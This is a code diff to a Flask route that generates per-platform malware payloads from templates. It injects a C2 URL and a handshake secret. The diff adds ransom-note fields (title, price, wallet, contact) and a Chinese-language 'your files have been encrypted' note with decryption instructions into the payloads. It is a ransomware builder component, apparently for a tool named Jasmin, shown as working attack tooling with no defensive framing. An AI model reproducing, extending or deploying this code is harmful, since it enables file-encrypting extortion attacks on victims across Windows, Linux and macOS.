@@ -173,16 +173,33 @@ def generate():
     plat = request.form.get('platform','')
     c2 = request.form.get('c2_url','')
     sec = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
+    ransom = {
+        'title': request.form.get('ransom_title','YOUR FILES HAVE BEEN ENCRYPTED'),
+        'contact': request.form.get('ransom_contact',''),
+        'body': request.form.get('ransom_body',''),
+        'price': request.form.get('ransom_price',''),
+        'wallet': request.form.get('ransom_wallet',''),
+    }
     if plat not in ('win','linux','macos'):
-        return jsonify(ok=False, msg='Invalid platform')
+        return jsonify(ok=False, msg='无效平台')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
     tok = secrets.token_hex(4)
     tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl'}
     ext_map = {'win':'.cs','linux':'.py','macos':'.py'}
     tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
     if not os.path.exists(tpl_path):
-        return jsonify(ok=False, msg='Template missing')
+        return jsonify(ok=False, msg='模板文件缺失')
     tpl = open(tpl_path).read().replace('{{C2_URL}}',c2).replace('{{HANDSHAKE}}',sec)
+    # 构建勒索信
+    dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'pip3 install cryptography && python3 jasmin_decrypt.py key.pem'
+    note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
+    if ransom['price']: note += f"\n💰 赎金: {ransom['price']}"
+    if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
+    if ransom['contact']: note += f"\n📧 {ransom['contact']}"
+    note += f"\n\n🔓 解密方法:\n{dec}\n\n✅ SHA-256 校验确保文件100%还原"
+    tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
+    for k,v in ransom.items():
+        tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","\\'"))
     name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
     with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
     return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))
